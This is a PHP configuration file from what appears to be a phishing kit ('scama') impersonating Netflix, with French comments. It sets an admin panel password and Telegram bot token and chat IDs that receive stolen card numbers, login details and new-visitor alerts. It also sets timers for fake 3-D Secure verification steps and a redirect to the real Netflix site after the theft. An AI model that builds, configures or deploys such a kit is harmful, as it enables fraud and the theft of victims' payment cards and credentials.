<?php
if (php_sapi_name() !== 'cli' && !defined('ALLOW_INCLUDE')) {
    http_response_code(404);
    exit('Accès interdit ! (403)');
}

return array (
  'SCAMA_NAME' => 'NETFLIX 2026', //

  'ADMIN_LOGIN' => 'admin', //Identifiant Panel
  'ADMIN_PASSWORD' => '',  //Mot de passe Panel changer le 

  'BOT_TOKEN' => '$bot_token', //Bot Token télégram
  'CHAT_ID' => '$rez_card',//Chat ID rez télégram CC ET LES ACTIONS
  'CHAT_INFO' => '$rez_login',//Chat ID rez login / infos  
  'CHAT_NOTIF' => '$rez_click', //Chat ID pour les notifications des nouveaux visiteurs

  'BILLING_NOTIF' => 1,         // 1 = tu recois les infos | 0 = Tu ne recois pas les infos  
  'CHAT_NOTIF_ENABLED' => '1', // 0 = Désactivé pas de notif new users  1 = Activé notif new users

  
  'REDIRECT_TIMER' => 90, //Redirect timer in secondes si pas de réponse dans vos vbv
  'REDIRECT_FINAL' => 5, //Redirect succes vers accueil

  'URL_REDIRECT' => 'https://www.netflix.com',    //redirection quand succès
  'API_IPAPI' => 'J9TQazL9UIH1so3',   //Clé IP API PRO Private
  
 



);
